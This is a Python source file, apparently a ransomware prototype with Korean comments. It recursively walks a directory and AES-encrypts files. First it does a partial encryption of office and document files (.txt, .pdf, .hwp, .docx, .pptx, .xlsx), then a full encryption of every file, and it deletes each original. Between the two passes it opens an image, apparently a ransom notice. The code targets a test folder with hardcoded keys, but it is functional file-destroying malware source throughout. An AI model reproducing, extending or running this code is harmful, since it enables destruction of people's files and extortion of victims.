import glob
import os, struct
from PIL import Image
from Cryptodome.Cipher import AES
from Cryptodome.Hash import SHA256 as SHA

default_ext = '.qsom01'
force_ext = '.qsom02'

txt_ext = '.txt'
pdf_ext = '.pdf'
hwp_ext = '.hwp'
pptx_ext = '.pptx'
word_ext = '.docx'
exel_ext = '.xlsx'

class AESPart():
    def __init__(self, key, iv, startPath):
        self.startPath = startPath
        hash = SHA.new()
        hash.update(key)
        key = hash.digest()
        self.key = key[:16]
        # 16바이트의 키 이용, 256바이트의 SHA hash 이용해 16바이트만 이용하겠단 의미

        hash.update(iv)
        iv = hash.digest()
        self.iv = iv[:16] # key와 마찬가지

    def enc(self, in_filename, out_filename=None, chunksize=64*1024):
        if not out_filename:
            out_filename = in_filename + default_ext

        encryptor = AES.new(self.key, AES.MODE_CBC, self.iv)
        filesize = os.path.getsize(in_filename)

        encbin = True

        with open(in_filename, 'rb') as infile:
            with open(out_filename, 'wb') as outfile:
                outfile.write(struct.pack('<Q', filesize))
                outfile.write(self.iv)

                while True:
                    if encbin == True:
                        chunk = infile.read(chunksize)
                        if len(chunk) == 0: break
                        elif len(chunk) % 16 != 0:
                            chunk += b' ' * (16 - len(chunk) % 16)
                        chunk = encryptor.encrypt(chunk)
                        encbin = False
                    else :
                        chunk = infile.read(chunksize)
                        if len(chunk) == 0: break
                    outfile.write(chunk)

    def work(self, mode, rec_mode=True):
        if mode == 'enc':
            for filename in glob.iglob(self.startPath, recursive=rec_mode):
                if (os.path.isfile(filename)):
                    fname, ext = os.path.splitext(filename)
                    if (ext == txt_ext or ext == pdf_ext or ext == hwp_ext or ext == pptx_ext or ext == word_ext or ext ==exel_ext):
                        self.enc(filename)
                        os.remove(filename)
                    else: pass

class AESFull():
    def __init__(self, key, iv, startPath):
        self.startPath = startPath
        hash = SHA.new()
        hash.update(key)
        key = hash.digest()
        self.key = key[:16]  # 16바이트의 키 이용, 256바이트의 SHA hash 이용해 16바이트만 이용하겠단 의미

        hash.update(iv)
        iv = hash.digest()
        self.iv = iv[:16]  # key와 마찬가지

    def enc(self, in_filename, out_filename=None, chunksize=64*1024):
        if not out_filename:
            out_filename = in_filename + force_ext

        encryptor = AES.new(self.key, AES.MODE_CBC, self.iv)
        filesize = os.path.getsize(in_filename)

        with open(in_filename, 'rb') as infile:
            with open(out_filename, 'wb') as outfile:
                outfile.write(struct.pack('<Q', filesize))
                outfile.write(self.iv)

                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0: break
                    elif len(chunk) % 16 != 0:
                        chunk += b' ' * (16 - len(chunk) % 16)
                    outfile.write(encryptor.encrypt(chunk))

    def work(self, mode, rec_mode=True):
        if mode == 'enc':
            for filename in glob.iglob(self.startPath, recursive=rec_mode):
                if (os.path.isfile(filename)):
                    self.enc(filename)
                    os.remove(filename)

if __name__ == '__main__':
    keytext = b'keytext'
    ivtext = b'ivtext'
    # startPath = os.getcwd()
    startPath = '../testdir/**'

    Fenc01 = AESPart(keytext, ivtext, startPath)
    Fenc02 = AESFull(keytext, ivtext, startPath)
    Fenc01.work('enc')
    im = Image.open('./readme_ck.png')
    im.show()
    Fenc02.work('enc')
